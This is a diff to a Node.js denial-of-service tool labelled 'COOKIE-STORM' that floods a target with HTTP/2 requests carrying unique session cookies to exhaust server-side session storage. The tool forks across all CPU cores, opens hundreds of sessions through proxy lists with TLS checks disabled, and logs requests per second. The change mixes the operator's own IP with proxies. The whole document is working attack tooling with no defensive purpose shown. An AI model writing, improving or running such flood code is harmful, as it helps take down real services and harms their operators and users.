@@ -1,6 +1,7 @@
 // R10-8: COOKIE-STORM - Session Cookie Flood
 // Focus: Server-side session storage exhaustion
 // Technique: Unique cookies per request
+// Updated: Mixed main IP + proxies
 
 const http2 = require('http2');
 const tls = require('tls');
@@ -21,8 +22,12 @@ try {
         .filter(line => line && !line.startsWith('#') && line.includes(':'));
     console.log(`[R10-8] Loaded ${proxies.length} proxies`);
 } catch (e) {
-    console.log('[R10-8] No proxy.txt found, running without proxies');
+    console.log('[R10-8] No proxy.txt found, running with main IP only');
 }
+
+// Mix settings
+const USE_MAIN_IP = true;
+const MIX_RATIO = 0.3; // 30% main IP
 
 try {
     userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
@@ -30,6 +35,10 @@ try {
         .filter(line => line && !line.startsWith('#'));
     console.log(`[R10-8] Loaded ${userAgents.length} user agents`);
 } catch (e) {}
+
+function shouldUseMainIp() {
+    return USE_MAIN_IP && Math.random() < MIX_RATIO;
+}
 
 function generateSessionCookie() {
     const sessions = [
@@ -45,6 +54,7 @@ function generateSessionCookie() {
 
 if (cluster.isMaster) {
     console.log(`[R10-8] COOKIE-STORM launching on ${CPU_CORES} cores`);
+    console.log(`[R10-8] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
     for (let i = 0; i < CPU_CORES; i++) cluster.fork();
     
     setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
@@ -54,15 +64,18 @@ if (cluster.isMaster) {
     const parsed = new URL(target);
     
     let requestCount = 0;
+    let mainIpCount = 0;
+    let proxyCount = 0;
     const sessions = [];
     
-    // Create session pool with proxies
+    // Create session pool with mixed IPs
     (async () => {
         for (let i = 0; i < 200; i++) {
             try {
+                const useMain = shouldUseMainIp();
                 let session;
                 
-                if (proxies.length > 0) {
+                if (!useMain && proxies.length > 0) {
                     const proxy = proxies[i % proxies.length];
                     const [proxyHost, proxyPort] = proxy.split(':');
                     
@@ -81,6 +94,7 @@ if (cluster.isMaster) {
                                 });
                                 session.on('error', () => {});
                                 sessions.push(session);
+                                proxyCount++;
                             });
                         });
                     });
@@ -88,11 +102,13 @@ if (cluster.isMaster) {
                     session = http2.connect(parsed.origin, { rejectUnauthorized: false });
                     session.on('error', () => {});
                     sessions.push(session);
+                    mainIpCount++;
                 }
             } catch (e) {}
             
             await new Promise(r => setTimeout(r, 50));
         }
+        console.log(`[R10-8] Connections: Main IP: ${mainIpCount}, Proxy: ${proxyCount}`);
     })();
     
     setTimeout(() => {
@@ -126,7 +142,7 @@ if (cluster.isMaster) {
         }, 50);
         
         setInterval(() => {
-            console.log(`[R10-8] RPS: ${requestCount}`);
+            console.log(`[R10-8] RPS: ${requestCount} | Main IP: ${mainIpCount} | Proxy: ${proxyCount}`);
             requestCount = 0;
         }, 1000);
         
